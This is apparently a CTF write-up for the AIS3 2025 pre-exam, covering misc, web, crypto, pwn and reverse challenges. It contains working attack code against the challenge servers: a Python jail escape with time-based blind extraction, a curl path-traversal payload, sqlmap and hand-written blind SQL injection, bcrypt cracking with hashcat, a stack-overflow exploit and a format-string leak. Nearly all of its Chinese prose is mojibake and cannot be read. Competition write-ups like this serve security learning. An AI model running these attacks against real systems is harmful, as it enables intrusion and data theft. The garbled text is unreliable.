---
title: AIS3 2025 Pre-exam
date: 2025-5-24
categories: [ais3, ctf, writeup]
---

# Introduction

![alt text]({{site.baseurl}}/assets/images/AIS3-2025-pre-exam/Introduction/graph.png)
![alt text]({{site.baseurl}}/assets/images/AIS3-2025-pre-exam/Introduction/rank.png)
![alt text]({{site.baseurl}}/assets/images/AIS3-2025-pre-exam/Introduction/problems.png)

# Misc

## Welcome

> Author : Curious <br>
Solves: 386 <br>
æœ‰ä¸‰å€‹äººè§£äº†åˆ¥çš„æ²’è§£ Welcome (?)

### Problem

![alt text]({{site.baseurl}}/assets/images/AIS3-2025-pre-exam/Welcome/problem.png)

### Solve

Ctrl + c & ctrl + v æœƒæ‹¿åˆ° AIS3{This_Is_Just_A_Fake_Flag_\~\~}

~~æ‰“éæœ€é›£çš„ Welcome~~

**Flag: AIS3{Welcome_And_Enjoy_The_CTF_!}**

## Ramen CTF

> Author: whale120 <br>
Solves: 329 <br>

### Problem

![alt text]({{site.baseurl}}\assets\images\AIS3-2025-pre-exam\Ramen-CTF\problem.png)

![alt text]({{site.baseurl}}\assets\images\AIS3-2025-pre-exam\Ramen-CTF\chal.jpg)

### Solve

æƒæç™¼ç¥¨å·¦é‚Š QRCode å¾—åˆ°

```
MF1687991111404137095000001f4000001f40000000034785923VG9sG89nFznfPnKYFRlsoA==:**********:2:2:1:è¦æ‹‰
```

åˆ°[è²¡æ”¿éƒ¨ - å…¨æ°‘ç¨½æ ¸å°ˆå€](https://www.einvoice.nat.gov.tw/portal/btc/audit/btc601w/search)è¼¸å…¥

- ç™¼ç¥¨è™Ÿç¢¼: MF16879911 (ä¸Šä¸€æ­¥å–å¾—)
- ç™¼ç¥¨æ—¥æœŸ: 2025/4/13 (ç™¼ç¥¨ä¸Šå–å¾—)
- 4ä½éš¨æ©Ÿç¢¼: 7095 (ç™¼ç¥¨ä¸Šå–å¾—)

æˆåŠŸæŸ¥åˆ°åº—åèˆ‡åœ°å€

`å¹³å’Œæº«æ³‰æ‹‰éºµåº— 262å®œè˜­ç¸£ç¤æºªé„‰å¾·é™½æ‘ç¤æºªè·¯äº”æ®µ108å··1è™Ÿ`

![alt text]({{site.baseurl}}\assets\images\AIS3-2025-pre-exam\Ramen-CTF\receipt.png)

Google map åœ°å€ä¸¦æ‰¾åˆ°[èœå–®](https://www.google.com/maps/place/%E6%A8%82%E5%B1%B1%E6%BA%AB%E6%B3%89%E6%8B%89%E9%BA%B5/@24.8270956,121.7722618,3a,75y,90t/data=!3m8!1e2!3m6!1sCIHM0ogKEICAgIDXooH1iQE!2e10!3e12!6shttps:%2F%2Flh3.googleusercontent.com%2Fgps-cs-s%2FAC9h4noifQH13fy1WzCha0VZBMFtr7pEGnPFIdDHD7Dgmzd8bnrfCKZkrsnEH1ynBmubACdJ7CPZjunrea-1-n4BvRkSZplet4C8In7kmvzBQqOesa5X4oa9XP5LOUhCEqL4exQwhgVZ%3Dw109-h195-k-no!7i3213!8i5712!4m16!1m8!3m7!1s0x3467fa49bd8f7513:0x10a674cabb79c0ad!2zMjYy5a6c6Jit57ij56SB5rqq6YSJ56SB5rqq6Lev5LqU5q61MTA45be3MeiZnw!3b1!8m2!3d24.8271561!4d121.772307!16s%2Fg%2F11csfyxftq!3m6!1s0x3467fa49bd91f239:0x508db800f782b2ca!8m2!3d24.8270391!4d121.7721991!10e9!16s%2Fg%2F11b7kcqnnr?entry=ttu&g_ep=EgoyMDI1MDUyMS4wIKXMDSoASAFQAw%3D%3D)ç¢ºèªåº—åèˆ‡å“å

**Flag: AIS3{æ¨‚å±±æº«æ³‰æ‹‰éºµ:è¦æ‹‰éºµ}**

## AIS3 Tiny Server - Web / Misc

> Author: pwn2ooown <br>
Solves: 147

### Problem

![alt text]({{site.baseurl}}\assets\images\AIS3-2025-pre-exam\AIS3-Tiny-Server-Web-Misc\problem.png)

### Solve

> 1. No security check

å¯ä»¥çœ‹åˆ° server æœƒç›´æ¥ open parse å®Œçš„è·¯å¾‘ï¼Œå†æª¢æŸ¥ `parse_request()` ç™¼ç¾ç¢ºå¯¦æ²’æœ‰ä»»ä½•æª¢æŸ¥

```c
444    http_request req;
445    parse_request(fd, &req);
446
447    struct stat sbuf;
448    int status = 200, ffd = open(req.filename, O_RDONLY, 0);
```

å‰å¾€ [http://chals1.ais3.org:port//]() access root å°±æœ‰ flag

![alt text]({{site.baseurl}}\assets\images\AIS3-2025-pre-exam\AIS3-Tiny-Server-Web-Misc\root.png)

**Flag: AIS3{tInY_weB_ServeR_WItH_fILe_BROWs1nG_@s_@_feature}**

## â™– PyWars â™–

> Author: naup96321 <br>
Solved: 1 <br>
Only solve !!!

### Problem

![alt text]({{site.baseurl}}\assets\images\AIS3-2025-pre-exam\PyWars\problem.png)

### Solve

æª”æ¡ˆä¸Šå‚³å¾Œä¸»è¦åšå››ä»¶äº‹
1. æª¢æŸ¥é™„æª”åæ˜¯å¦ç‚º `.py`
2. æª¢æŸ¥æ˜¯å¦åŒ…å« `TomorinIsCuteAndILovePython`
3. å–ä»£æ‰€æœ‰ `()}{|?!^` æˆç©ºç™½
4. åœ¨æª”æ¡ˆå‰é¢åŠ ä¸Š `exit()` ä¸¦ç”¨ `python3` åŸ·è¡Œ

å¾ open file mode æ˜¯ `wb` é‚„æœ‰ `index.html` ä¸Šå‚³æª”æ¡ˆåŒ…å« `pyc` çŒœåˆ°æ‡‰è©²æ˜¯è¦è®“ python è·‘åˆ¥ç¨®æª”æ¡ˆ

èªçœŸè®€ [python document](https://docs.python.org/3/using/cmdline.html#:~:text=or%20a%20zipfile%20containing%20a%20__main__.py%20file.) æœƒç™¼ç¾

> Execute the Python code ... referring to either a Python file, a directory containing a \_\_main\_\_.py file, or a **zipfile containing a \_\_main\_\_.py file**.

å†æœå°‹ç™¼ç¾å¯ä»¥ç”¨ [`zipapp` module](https://peps.python.org/pep-0441/#command-line-usage)ä¾†ç”¢ç”Ÿ zip

ç¶“éå¯¦é©— `.pyz` å‰é¢åŠ  `exit()` æ²’æœ‰å½±éŸ¿ï¼Œæœ€éº»ç…©çš„ 4. å°±ç¹æ‰äº†

å‰©ä¸‹ä¸‰é»

1. 

æª¢æŸ¥å‰¯æ“‹åæ˜¯ç”¨æœ€å¾Œä¸€å€‹

```python
def allowed_file(filename):
    _, ext = os.path.splitext(filename)
    return ext.lower() == '.py'
```

ä½†å­˜æª”æ˜¯ç”¨ç¬¬ä¸€å€‹

```python
ext = file.filename.split('.', 1)[1].lower()
random_hash = generate_random_hash()
filename = os.path.join(app.config['UPLOAD_FOLDER'], f'main_{random_hash}.{ext}')
```

å¯ä»¥ç”¨ `.pyz.py` ç¹é

2\. éš¨ä¾¿å¡è¨»è§£å°±å¥½ <br>
3\. ç”¨ decorator åŸ·è¡Œ command
[script](https://polygl0ts.ch/writeups/2021/b01lers/pyjail_noparens/README.html) æŠ„ç¶²è·¯ä¸Šçš„

æœ€å¾Œä»”ç´°çœ‹æœƒç™¼ç¾ output ä¸å¯æ§ä½†æœƒ time outï¼Œå¯ä»¥ç”¨ time-based blind ä¾†æŒ– flag

```python
return f'Success Execute! But if you don\'t get flag...You Lose...'

        except subprocess.TimeoutExpired as e:
            return f'Timeout Error! You Lose ... '
        except Exception as e:
            return f"Something went wrong! You Lose"

    return 'Your file is not \'.py\'.'
```

solve script ~~æˆ‘æ‡¶å¾—å¯«äºŒåˆ†æœ~~ (naup96321 èªªå…¶å¯¦å¯ä»¥ popen send flag å°±å¥½)

```python
import os
import requests

def check(pos, c):
    s = \
    f"time.sleep(20) if open('/app/flags/' + os.listdir('/app/flags')[0]).read()[{pos}] == '{c}' else False"
    l = ""
    for c in s:
        l += str(ord(c)) + ', '
    return l

folder = "payload"

flag = ""
while True:
    for c in range(256):
        with open(f"{folder}/__main__.py", 'w') as f:
            f.write("import os\n")
            f.write("import time\n")
            f.write("# TomorinIsCuteAndILovePython\n")
            f.write("exit = lambda x : x\n")
            f.write(f"for x in [[{check(len(flag), chr(c))}]]:\n")
            f.write(f"\tfor y in [lambda z: x]:\n")
            f.write(f"\t\t@print\n")
            f.write(f"\t\t@eval\n")
            f.write(f"\t\t@bytes\n")
            f.write(f"\t\t@y\n")
            f.write(f"\t\tclass z:\n")
            f.write(f"\t\t\tpass\n")
        os.system(f"python -m zipapp {folder}")
        os.system(f"mv {folder}.pyz {folder}.pyz.py")

        try:
            r = requests.post(
                "http://chals1.ais3.org:10000/upload", 
                files = {'file': open(f"{folder}.pyz.py",'rb')},
                timeout = 2
            )
        except:
            flag += chr(c)
            print(flag)
            break
        
        if c == 255:
            exit()
```

**Flag: AIS3{Success!!!!!_y0u_are_M6s73r_0f_python@z1p_1s_c00l...and_dec0rat0r_1s_c00l!}**

# Web

## Tomorin db ğŸ§

> Author : naup96321 <br>
Solved: 282

### Solve

![alt text]({{site.baseurl}}/assets/images/AIS3-2025-pre-exam/Tomorin-db/problem.png)

ä¸€å€‹æœƒæŠŠ `/flag` redirect çš„ golang server

```go
package main

import "net/http"

func main() {
    http.Handle("/", http.FileServer(http.Dir("/app/Tomorin")))
    http.HandleFunc("/flag", func(w http.ResponseWriter, r *http.Request) {
        http.Redirect(
            w,
            r,
            "https://youtu.be/lQuWN0biOBU?si=SijTXQCn9V3j4Rl6",
            http.StatusFound
        )
    })
    http.ListenAndServe(":30000", nil)
}
```

### Solve

Google å¾Œæ‰¾åˆ°ä¸€æ¨£çš„[é¡Œç›®](https://bycsec.top/2021/02/07/golang%E7%9A%84%E4%B8%80%E4%BA%9B%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/#:~:text=%E4%B8%8E%E4%B8%8A%E4%BC%A0%E3%80%82-,weird%20stuff,-%E5%9C%A8%E4%B9%8B%E5%89%8D%E7%9A%84)ï¼Œç›´æ¥æŠ„ payload

`curl --path-as-is -X CONNECT http:///../flag`

**Flag: AIS3{G01ang_H2v3_a_c0O1_way!!!_Us3ing_C0NN3ct_M3Th07_L0l@T0m0r1n_1s_cute_D0_yo7_L0ve_t0MoRIN?}**

## Login Screen 1

> Author: Ching367436 <br>
Solves: 217

### Problem

![alt text]({{site.baseurl}}\assets\images\AIS3-2025-pre-exam\Login-Screen-1\problem.png)

### Solve

`index.php` æ˜é¡¯æœ‰ sql injection

```php
// index.php
$stmt = $db->prepare("SELECT * FROM Users WHERE username = '$username'");
```

`init.php` æœ‰ database scheme

```php
// init.php
$db->exec("CREATE TABLE IF NOT EXISTS Users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT NOT NULL UNIQUE,
    password TEXT NOT NULL,
    code TEXT NOT NULL
)");
```

ç›´æ¥ç”¨ sqlmap dump database

```bash
sqlmap -u "http://login-screen.ctftime.uk:36368/index.php" \
--forms -T Users -C username,password \
--dump
```

![alt text]({{site.baseurl}}\assets\images\AIS3-2025-pre-exam\Login-Screen-1\sqlmap.png)

æ‹¿åˆ° hash

```
$2y$10$Hf11AOUj8lw13DogTnS3aOvjD1hPnfsOx8qMKZzG8dGCWujtTRvBC
```

ç”¨ hsahcat çˆ†å¯†ç¢¼å¾—åˆ° admin

```bash
hashcat -m 3200 -a 0 hash rockyou.txt
```

login å¾Œé€²åˆ° 2faï¼Œé€™è£¡å…¶å¯¦ä¸Šä¸€æ­¥ sqlmap å¤šä¸€å€‹ `code` å°±å¯ä»¥ï¼Œä½†æˆ‘å¿˜äº†ï¼Œsqlmap æ‰“å¤ªå¤§åŠ› IP ä¸€ç›´è¢« ban dump ä¸å‡ºä¾†ï¼Œåªå¥½è‡ªå·±å¯« scriptã€‚ç”¨ `'` é—œé–‰ `username` å†ç”¨ `LIKE` æ¯”è¼ƒcode çš„å‰å¹¾ç¢¼ï¼Œä¸€ç¢¼ä¸€ç¢¼çˆ†

```python
import requests

code = ""

while True:
    for i in range(10):
        r = requests.post(
            "http://login-screen.ctftime.uk:36368/index.php",
            data = {
                'username': f"admin' AND code LIKE '{code}{i}%",
                'password': 'admin'
            }
        )
        if r.content != b"Invalid username or password.":
            code += str(i)
            print(code)
            break

        if i == 9:
            exit()
```

åŸ·è¡Œå®Œå¾—åˆ° 2fa code æ˜¯ `51756447753485459839`

ç™»å…¥å¾Œå°±æœ‰ flag äº†

![alt text]({{site.baseurl}}\assets\images\AIS3-2025-pre-exam\Login-Screen-1\flag.png)

**FLAG: AIS3{1.Es55y_SQL_1nJ3ct10n_w1th_2fa_IuABDADGeP0}**

# Crypto

## Stream

> Author : Whale120 <br>
Solved: 146

### Problem

![alt text]({{site.baseurl}}/assets/images/AIS3-2025-pre-exam/Stream/problem.png)

```python
from random import getrandbits
import os
from hashlib import sha512
from flag import flag

def hexor(a: bytes, b: int):
    return hex(int.from_bytes(a)^b**2)

for i in range(80):
    print(hexor(sha512(os.urandom(True)).digest(), getrandbits(256)))

print(hexor(flag, getrandbits(256)))
```

### Solve

æ˜é¡¯æ˜¯ [random number predict](https://github.com/tna0y/Python-random-module-cracker)ï¼Œéœ€è¦ 624 å€‹ 32 bits numberï¼Œé¡Œç›®æœ‰ 80 å€‹ 256 bits numberï¼Œ$$80 \times 256 > 624 \times 32$$ï¼Œæ‰€ä»¥å¯ä»¥åš

æ³¨æ„åˆ° `hexor()` æœƒæŠŠéš¨æ©Ÿæ•¸å¹³æ–¹å† XOR `sha512(urandom)`ï¼Œä½†å› ç‚º `urandom` å¤§å°æ˜¯ `True (1)`ï¼Œé å…ˆç®—å‡ºæ‰€æœ‰ byte çš„ sha512 å¾Œï¼Œä¸€å€‹å€‹æŠŠ output XOR å›å»ï¼Œå–åŸæœ¬æ˜¯å®Œå…¨å¹³æ–¹æ•¸çš„æ•¸å­—å°±æœƒæ˜¯ randbits

```python
import math
from hashlib import sha512
from randcrack import RandCrack
from Crypto.Util.number import long_to_bytes

hashes = [int.from_bytes(sha512(bytes([byte])).digest()) for byte in range(256)]
lines = open("output.txt", 'r').readlines()
outputs = [int(line, 16) for line in lines[:-1]]

rc = RandCrack()
for output in outputs:
    for hash in hashes:
        square = output ^ hash
        rand = math.isqrt(square)
        if square == math.isqrt(square) ** 2:
            if rc.state:
                assert rand == rc.predict_getrandbits(256)
            else:
                byte = []
                for _ in range(8):
                    rc.submit(rand & 0xffffffff)
                    rand >>= 32
            break

print(long_to_bytes(int(lines[-1], 16) ^ rc.predict_getrandbits(256)**2))
```

**Flag: AIS3{no_more_junks...plz}**

## Random_RSA
> Author : hahabox0 <br>
Solved: 83

### Problem

![alt text]({{site.baseurl}}/assets\images\AIS3-2025-pre-exam\Random_RSA\problem.png)

<button type="button" class="collapsible" id="Stream-problem-script">Full script</button>
<div class="hidden-content" id="Stream-problem-script-data" markdown="1">

```python
# chall.py
from Crypto.Util.number import getPrime, bytes_to_long
from sympy import nextprime
from gmpy2 import is_prime

FLAG = b"AIS3{Fake_FLAG}"

a = getPrime(512)
b = getPrime(512)
m = getPrime(512)
a %= m
b %= m
seed = getPrime(300)

rng = lambda x: (a*x + b) % m


def genPrime(x):
    x = rng(x)
    k=0
    while not(is_prime(x)):
        x = rng(x)
    return x

p = genPrime(seed)
q = genPrime(p)

n = p * q
e = 65537
m_int = bytes_to_long(FLAG)
c = pow(m_int, e, n)

# hint
seed = getPrime(300)
h0 = rng(seed)
h1 = rng(h0)
h2 = rng(h1)

with open("output.txt", "w") as f:
    f.write(f"h0 = {h0}\n")
    f.write(f"h1 = {h1}\n")
    f.write(f"h2 = {h2}\n")
    f.write(f"M = {m}\n")
    f.write(f"n = {n}\n")
    f.write(f"e = {e}\n")
    f.write(f"c = {c}\n")
```
</div>

### Solve

$$
\text{let the seed below "#hint" be } x \\
\begin{align*}
  h_0 &\equiv ax + b &\mod m \\
  h_1 &\equiv ah_0 + b &\mod m \\
  &\equiv a^2x + ab + b &\mod m \\
  h_2 &\equiv ah_1 + b &\mod m \\
  &\equiv a^3x + a^2b + ab + b &\mod m \\
  h_1 - h_0 &\equiv a((a - 1)x + b) &\mod m \\
  h_2 - h_1 &\equiv a^2((a - 1)x + b) &\mod m \\
  a &\equiv (h_2 - h_1)(h_1 - h_0)^{-1} &\mod m \\
  b &\equiv h_1 - ah_0 &\mod m \\
\end{align*}\\
$$

è§£å®Œ `a, b` å‰©ä¸‹çš„è·Ÿ[é€™ç¯‡](https://blog.maple3142.net/2021/12/07/hitcon-ctf-2021-writeups/#so-easy-rsa)ä¸€æ¨£ï¼Œscript ç…§æŠ„ç”¨ sage å°±èƒ½ç®—å‡º `p, q`

```python
from Crypto.Util.number import long_to_bytes

h0, h1, h2, M, n, e, c =

h1_h0 = (h1 - h0 + M) % M
h2_h1 = (h2 - h1 + M) % M
a = (h2_h1 * pow(h1_h0, -1, M)) % M
b = (h1 - a * h0 + M) % M

def brute(interval):
    Z = Zmod(M)
    P = PolynomialRing(Z, "pp")
    pp = P.gen()
    qq = pp
    for _ in range(interval):
        qq = a * qq + b
    f = pp * qq - n
    return [ZZ(p) for p, e in f.roots()]

for i in range(1, 1000):
    print(i)
    r = brute(i)
    for p in r:
        if n % p == 0:
            q = p
            for _ in range(i):
                q = (a * q + b) % M
                if p * q == n:
                    print(i, p, q)
                    exit()

i, p, q = 
r = (p - 1) * (q - 1)
d = pow(e, -1, r)
print(long_to_bytes(pow(c, d, n)))
```

**Flag: AIS3{1_d0n7_r34lly_why_1_d1dn7_u53_637pr1m3}**

## Hill

> Author : hahabox0 <br>
Solved: 73

### Problem

![alt text]({{site.baseurl}}/assets\images\AIS3-2025-pre-exam\Hill\problem.png)

<button type="button" class="collapsible" id="Hill-problem-script">Full script</button>
<div class="hidden-content" id="Hill-problem-script-data" markdown="1">

```python
import numpy as np

p = 251
n = 8

def gen_matrix(n, p):
    while True:
        M = np.random.randint(0, p, size=(n, n))
        if np.linalg.matrix_rank(M % p) == n:
            return M % p

A = gen_matrix(n, p)
B = gen_matrix(n, p)

def str_to_blocks(s):
    data = list(s.encode())
    length = ((len(data) - 1) // n) + 1
    data += [0] * (n * length - len(data))  # padding
    blocks = np.array(data, dtype=int).reshape(length, n)
    return blocks

def encrypt_blocks(blocks):
    C = []
    for i in range(len(blocks)):
        if i == 0:
            c = (A @ blocks[i]) % p
        else:
            c = (A @ blocks[i] + B @ blocks[i-1]) % p
        C.append(c)
    return C

flag = "AIS3{Fake_FLAG}"
blocks = str_to_blocks(flag)
ciphertext = encrypt_blocks(blocks)

print("Encrypted flag:")
for c in ciphertext:
    print(c)

t = input("input: ")
blocks = str_to_blocks(t)
ciphertext = encrypt_blocks(blocks)
for c in ciphertext:
    print(c)
```
</div>

### Solve

$$
A, B \text{ are random } n \times n \text{ matrix}\\
F \text{ is the } l \times n \text{ flag matrix}\\
E \text{ will then be a } l \times n \text{ matrix}\\
M \text{ is the } m \times n \text{ input matrix}\\
C \text{ will then be a } m \times n \text{ matrix}\\
\begin{align*}
  E_{1,}^T &\equiv AF_{1,}^T &\mod p \\
  E_{i,}^T &\equiv AF_{i,}^T + BF_{i - 1,}^T &\mod p &\ \ \forall i \in \{2, 3, \dots, n\}\\
  C_{1,}^T &\equiv AM_{1,}^T &\mod p \\
  C_{i,}^T &\equiv AM_{i,}^T + BM_{i - 1,}^T &\mod p &\ \ \forall i \in \{2, 3, \dots, n\}\\
\end{align*}\\
$$

é¦–å…ˆï¼Œå¦‚æœ $$M_{1,}$$ ç‚º $$[1, 0, 0, \dots]$$ï¼Œå‰‡ $$C_{1, } = A_{,1}^T$$
æ¥è‘—ï¼Œå¦‚æœ $$M_{2,}$$ ç‚º $$\textbf{0}_{1, n}$$ï¼Œå‰‡ $$C_{1, } = B_{,1}^T$$ï¼Œå¼•æ­¤åªè¦è¼¸å…¥ $$\textbf{I}_{n, n}$$ èˆ‡ $$\textbf{0}_{n, n}$$ æ¯åˆ— (row) äº¤éŒ¯è€Œæˆçš„å°±èƒ½æŠŠ $$A, B$$ å·å‡ºä¾†

$$
\begin{bmatrix}
    1 & 0 & 0 & \dots  & 0 \\
    0 & 0 & 0 & \dots  & 0 \\
    0 & 1 & 0 & \dots  & 0 \\
    0 & 0 & 0 & \dots  & 0 \\
    \vdots & \vdots & \vdots & \ddots & \vdots \\
    0 & 0 & 0 & \dots  & 1 \\
    0 & 0 & 0 & \dots  & 0 \\
\end{bmatrix}
$$

æœ€å¾Œå¯ä»¥ç®—å‡º $$F$$

$$
\begin{align*}
  F_{1,}^T &\equiv A^{-1}E_{1,}^T &\mod p \\
  F_{i,}^T &\equiv A^{-1}(E_{i,}^T - BF_{i - 1,}^T)  &\mod p &\ \ \forall i \in \{2, 3, \dots, n\}\\
\end{align*}\\
$$

<button type="button" class="collapsible" id="Hill-solve-script">Full script</button>
<div class="hidden-content" id="Hill-solve-script-data" markdown="1">

```python
import numpy as np
from pwn import *
from sympy import Matrix

p = 251
n = 8

io = remote("chals1.ais3.org", 18000)

def read_block():
    block = np.ndarray(n, dtype = int)
    line = io.recvline()
    i = 0
    for num in line.strip(b"[ ]\n").decode().split(' '):
        if num == "":
            continue
        block[i] = int(num)
        i += 1
    return block

io.recvuntil(b"Encrypted flag:\n")
encrypted_flag = [read_block() for _ in range(5)]

io.recvuntil(b"input: ")
input = b"".join([
    b"\x01\x00\x00\x00\x00\x00\x00\x00",
    b"\x00\x00\x00\x00\x00\x00\x00\x00",
    b"\x00\x01\x00\x00\x00\x00\x00\x00",
    b"\x00\x00\x00\x00\x00\x00\x00\x00",
    b"\x00\x00\x01\x00\x00\x00\x00\x00",
    b"\x00\x00\x00\x00\x00\x00\x00\x00",
    b"\x00\x00\x00\x01\x00\x00\x00\x00",
    b"\x00\x00\x00\x00\x00\x00\x00\x00",
    b"\x00\x00\x00\x00\x01\x00\x00\x00",
    b"\x00\x00\x00\x00\x00\x00\x00\x00",
    b"\x00\x00\x00\x00\x00\x01\x00\x00",
    b"\x00\x00\x00\x00\x00\x00\x00\x00",
    b"\x00\x00\x00\x00\x00\x00\x01\x00",
    b"\x00\x00\x00\x00\x00\x00\x00\x00",
    b"\x00\x00\x00\x00\x00\x00\x00\x01",
    b"\x00\x00\x00\x00\x00\x00\x00\x00",
])
io.sendline(input)
A = np.ndarray((n, n), dtype = int)
B = np.ndarray((n, n), dtype = int)
for i in range(n):
    A[:, i] = read_block()
    B[:, i] = read_block()

A_inv = Matrix(A).inv_mod(p)
B = Matrix(B)
encrypted_flag = [Matrix(enc) for enc in encrypted_flag]
matrices = [(A_inv * encrypted_flag[0]) % p]
for i in range(4):
    matrices.append((A_inv * (encrypted_flag[i + 1] - B * matrices[i])) % p)
flag = "".join([chr(num) for matrix in matrices for num in matrix])
print(flag)

io.interactive()
```
</div>

**Flag: AIS3{b451c_h1ll_c1ph3r_15_2_3z_f0r_u5}**

# Pwn

## Welcome to the World of Ave Mujica ğŸŒ™

> Author: pwn2ooown <br>
Solved: 121

### Problem

![alt text]({{site.baseurl}}\assets\images\AIS3-2025-pre-exam\Welcome-to-the-World-of-Ave-Mujica\problem.png)

### Solve

åŸ·è¡Œå¾Œå†åŠ ä¸Š assembly å¯ä»¥çœ‹åˆ°è¼¸å…¥å®Œ yes å¾Œå¯ä»¥è¼¸å…¥ä¸€å€‹é•·åº¦åŠè©²é•·åº¦çš„å­—ä¸²

![alt text]({{site.baseurl}}\assets\images\AIS3-2025-pre-exam\Welcome-to-the-World-of-Ave-Mujica\chal.png)

![alt text]({{site.baseurl}}\assets\images\AIS3-2025-pre-exam\Welcome-to-the-World-of-Ave-Mujica\main.png)

`read_int8()` çš„æ•¸å­—å¿…é ˆæ¯” 128 å°ï¼Œ~~æ‰€ä»¥çŒœ -1ï¼ŒæˆåŠŸ `SIGSEGV` è“‹rbp å°±æœ‰ flag äº†~~

![alt text]({{site.baseurl}}\assets\images\AIS3-2025-pre-exam\Welcome-to-the-World-of-Ave-Mujica\read_int8.png)

æ³¨æ„åˆ° `0x401482` æœƒæŠŠ `read_int8` çš„çµæœåªè¤‡è£½ä¸€ byte (`al`) ä½œç‚ºé•·åº¦ï¼Œæ‰€ä»¥è¼¸å…¥ -1 (0xffffffffffffffff) <= 127ï¼Œè¤‡è£½å¾Œæœƒæ˜¯ 0xff (255)

![alt text]({{site.baseurl}}\assets\images\AIS3-2025-pre-exam\Welcome-to-the-World-of-Ave-Mujica\mov.png)

å†çœ‹è“‹åˆ° reuturn address çš„ padding æ˜¯ 0xa8

![alt text]({{site.baseurl}}\assets\images\AIS3-2025-pre-exam\Welcome-to-the-World-of-Ave-Mujica\stack.png)

å¦å¤–å¯ä»¥æ‰¾åˆ°çµ¦ shell çš„ win function

![alt text]({{site.baseurl}}\assets\images\AIS3-2025-pre-exam\Welcome-to-the-World-of-Ave-Mujica\win.png)

```python
from pwn import *

exe = ELF("./chal")
# p = process("./chal")
p = remote("chals1.ais3.org", 60651)

p.sendlineafter(b"?", b"yes")
p.sendlineafter(b":", b"-1")
p.sendlineafter(
    b":",
    b"A" * 168 + p64(exe.symbols['Welcome_to_the_world_of_Ave_Mujica'])
)

p.interactive()
```

æˆåŠŸå–å¾— flag
![alt text]({{site.baseurl}}\assets\images\AIS3-2025-pre-exam\Welcome-to-the-World-of-Ave-Mujica\flag.png)

**FLAG: AIS3{Ave MujicağŸ­å°‡å¥‡è¹Ÿå¸¶å…¥æ—¥å¸¸ä¸­ğŸ›(FortunağŸ’µğŸ’µğŸ’µ)...Ave MujicağŸ­ç‚ºä½ ç»ä¸Šæ…ˆæ‚²æ†æ†«âœï¸(LacrimağŸ˜­ğŸ¥²ğŸ’¦)..._ecdd2f5868ac72a6d28cdf469bdcb996}**

## Format Number

> Author : Curious <br>
Solved: 54

### Problem

![alt text]({{site.baseurl}}\assets\images\AIS3-2025-pre-exam\Format Number\problem.png)

### Solve

é¡Œç›®åšä¾åºåš 3 ä»¶äº‹
1. æŠŠ flag è®€åˆ° stack ä¸Š
2. æª¢æŸ¥è¼¸å…¥åªåŒ…å«ç¬¦è™Ÿæ•¸å­—
3. `printf("Format number : %3$<input>d\n", str, str, number)`

å¾ `printf` çš„ [man page](https://man7.org/linux/man-pages/man3/printf.3.html#:~:text=argument%20is%20required.-,%25,-A%20%27%25%27%20is%20written) çœ‹åˆ°å¯ä»¥ç”¨ `%` é—œé–‰ç¬¬ä¸€å€‹ conversionï¼Œæ¥è‘—è‡ªå·±åŠ å…¥ `$<i>%` ä¾† leak stack ä¸Šç¬¬ i å€‹ valueï¼Œå°±å¯ä»¥åœ¨ stack ä¸Šæ‰¾åˆ° flagï¼Œé€™è£¡æ¯å€‹å­—å…ƒéƒ½æ˜¯ç”¨ 32 bit int å­˜

```python
from pwn import *

flag = ""
for i in range(20, 59):
    # p = process("./share/chal")
    p = remote("chals1.ais3.org", 50960)
    p.sendlineafter(b"What format do you want ? ", f"%%{i}$".encode())
    line = p.recvline()
    if b'-' in line:
        continue
    flag += chr(int(line.decode().strip().split('%')[1]).to_bytes(4, 'little')[0])
    p.close()
print(flag)
```

AIS3{S1d3_ch@nn3l_0n_fOrM47_strln&_!!!}

# Reverse

## AIS3 Tiny Server - Rev

> Author: pwn2ooown <br>
Solved: 164

### Problem

![alt text]({{site.baseurl}}\assets\images\AIS3-2025-pre-exam\AIS3-Tiny-Server-Rev\problem.png)

### Solve

å°‹æ‰¾å¾Œæœƒç™¼ç¾ä¸€å€‹ `check_flag()` functionï¼Œæ˜¯ç°¡å–®çš„ XOR loop

![alt text]({{site.baseurl}}\assets\images\AIS3-2025-pre-exam\AIS3-Tiny-Server-Rev\check_flag.png)

æŠŠ function ä¸­çš„ encypted data è·Ÿ key åš XOR ä¾†å¾—åˆ° flag

```python
enc = \
"3 8X\x12(\\G)R-\x0fZ\n\x0e\x00\x0fX\x13P\x19Z\x194X13C\x13A\x04Z\x194X,3SF\x03\x1eHJJ\x14\x00"
key = "rikki_l0v3"

flag = ""
for i, c in enumerate(enc):
    flag += chr(ord(c) ^ ord(key[i % len(key)]))
print(flag)
```

AIS3{w0w_a_f1ag_check3r_1n_serv3r_1s_c00l!!!}

## babyUnicorn

> Author: ShallowFeather <br>
Solved: 5

### Problem

![alt text]({{site.baseurl}}\assets\images\AIS3-2025-pre-exam\babyUnicorn\problem.png)

~~åå­—éƒ½è¢«å¯«åˆ°é¡Œç›®ä¸Šäº†èƒ½ä¸è§£å—~~

### Solve

#### chal.py

- `main()`

è®€å…¥ input å¯«åˆ° stack ä¸Š `FLAG_ADDR` ç„¶å¾Œç”¨ x86 32 bit æ¨¡æ“¬ `code` é€™æ®µ shell code

- ä¸€äº› constant

```python
ADDRESS_CODE = 0x1000000
ADDRESS_STACK = 0x2000000
STACK_SIZE = 0x4000  # 16KB for stack
CODE_SIZE = 0x10000   # 4KB for code
FLAG_ADDR = ADDRESS_STACK + STACK_SIZE - 0x100 + 0x20
FLAG_LEN = 47
```

- `hook_code`
    - hook all code
    - if instruction is `\xcd\x06 (int 0x6)`, set `eip = ADDRESS_CODE`, `esi = 0x6`

- `hook_code1`
    - hook at 0x10010d0
    - set `eip = ADDRESS_CODE`, `esi = 0x6`

- `hook_code2`
    - hook at 0x10003fc
    - æª¢æŸ¥ `FLAG_ADDR` ä¸Šçš„æ±è¥¿æ˜¯å¦ç‚º `GOAL` ä¸¦è¼¸å‡º `flag is correct/wrong` 

- `hook_code3`
    - `eip += 2`
    - æ²’æœ‰ hook åœ¨ä»»ä½•åœ°æ–¹ï¼Œå¾ŒçºŒè§£é¡Œä¹Ÿç”¨ä¸åˆ°ï¼ŒçŒœä¸æ˜¯æç¤ºï¼Œ~~æ˜¯æ·ºç¾½å¿˜äº†åˆª~~

- `hook_exception`
    - hook all interupt
    - ç¬¬äºŒæ¬¡ `exception_type` æ˜¯ 0x2dï¼Œæœƒ `exit()`
    - å¦å‰‡ set `eip = ADDRESS_CODE`, `esi = exception_type`

- `hook_insn`
    - hook at `CPUID` instruction
